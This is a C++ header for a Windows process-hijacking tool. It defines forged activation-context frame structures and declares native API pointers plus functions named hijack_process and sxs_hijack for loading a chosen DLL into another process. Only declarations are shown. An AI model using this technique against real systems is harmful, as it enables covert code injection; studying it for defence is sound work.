#pragma once
#include<Windows.h>
#include<string>
#include<iostream>
#include<winternl.h>
#include<fstream>
#include<ntstatus.h>
#include "utils.h"
#include<WinBase.h>
#include<winnt.h>
#include"ntpebteb.h"

#pragma comment(lib, "ntdll.lib")

#pragma pack(push, 1)
struct RtlActivationContextFrame 
{
    RtlActivationContextFrame* _previous; 
    void* activation_context;              
    uint32_t flags;                      
    RtlActivationContextFrame():
        _previous(nullptr),
        activation_context(nullptr),
        flags(0xC)
    {

    }

};
#pragma pack(pop)

struct FrameListElement 
{
    RtlActivationContextFrame activation_context_frame; 
    uint32_t padding;                                   
    uint64_t cookie;                                   
    uint8_t unknown[64];       
    FrameListElement()
        : activation_context_frame(),
        padding(0),
        cookie(0),
        unknown{}
    {

    }
};

// Define the FrameListWrapper struct
struct FrameListWrapper 
{
    uint32_t magic_bytes;          
    uint32_t num_elements;         
    void* flink;                   
    void* blink;                   
    uintptr_t not_num_elements;       
    FrameListElement list_elements[32]; 

    FrameListWrapper()
        : magic_bytes(0x74736c46),
        num_elements(1),
        flink(nullptr),
        blink(nullptr),
        not_num_elements(0xfffffffe00000000)
    {
        for (size_t i = 0; i < 32; i++)
        {
            list_elements[i] = FrameListElement();;
        }
    }
    
};
 
typedef struct _THREAD_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PVOID TebBaseAddress;
    CLIENT_ID ClientId;
    KAFFINITY AffinityMask;
    KPRIORITY Priority;
    KPRIORITY BasePriority;
} THREAD_BASIC_INFORMATION;



#define TOTAL_SIZE  sizeof(FrameListWrapper) + 528

typedef NTSTATUS(WINAPI* _NtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

typedef NTSTATUS(WINAPI* NtWriteVirtualMemory_t)(HANDLE ProcessHandle,PVOID BaseAddress,PVOID Buffer,ULONG Size,PSIZE_T NumberOfBytesWritten);

typedef NTSTATUS(NTAPI* RtlAdjustPrivilege_t)(ULONG Privilege,BOOLEAN Enable,BOOLEAN CurrentThread,PBOOLEAN Enabled);

typedef NTSTATUS(NTAPI* pNtOpenThread)(PHANDLE ThreadHandle,ACCESS_MASK DesiredAccess,POBJECT_ATTRIBUTES ObjectAttributes,CLIENT_ID *ClientId); 

typedef NTSTATUS(NTAPI* pNtQueryInformationThread)(HANDLE ThreadHandle, THREADINFOCLASS ThreadInformationClass, PVOID ThreadInformation, ULONG ThreadInformationLength, PULONG ReturnLength);

typedef NTSTATUS(NTAPI* pNtOpenProcess)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, CLIENT_ID *ClientId);

typedef NTSTATUS(NTAPI *pNtReadVirtualMemory)(HANDLE ProcessHandle,PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToRead, PULONG NumberOfBytesReaded);

void hijack_process(HANDLE process_handle, HANDLE thread_handle, LPBYTE ac_struct_ptr, DWORD dwSize, BOOL resume_thread);
void sxs_hijack(DWORD pid, std::wstring target_dll, std::wstring dummy_dll, bool enable_debug);
